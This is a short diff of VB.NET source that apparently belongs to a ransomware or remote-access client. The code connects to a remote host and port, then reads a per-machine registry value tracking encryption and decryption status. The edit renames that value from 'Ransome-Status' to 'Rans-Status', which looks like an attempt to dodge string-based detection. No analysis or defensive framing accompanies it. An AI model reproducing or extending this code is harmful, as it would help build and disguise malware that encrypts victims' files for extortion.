@@ -38,7 +38,7 @@ Public Class Main
             C.Client.Connect(H, P)
             CN = True
             Try
-                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
+                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", Nothing)
                 If readValue = "Decrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
                     GoTo cc
                 End If
